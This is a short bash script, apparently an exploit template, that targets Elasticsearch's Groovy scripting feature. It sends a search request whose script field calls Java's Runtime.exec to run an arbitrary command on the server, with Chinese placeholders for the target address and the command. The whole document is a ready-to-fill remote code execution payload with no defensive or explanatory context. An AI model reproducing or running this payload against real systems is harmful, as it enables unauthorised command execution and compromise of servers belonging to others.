#!/bin/bash

curl -XPOST "目标地址:9200/_search" -d
{
    "size":1,
    "script_fields": 
        {"knownsec": 
            {"script":
                 "p=Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"你要执行的命令\").getText()","lang": "groovy"
            }
        }
}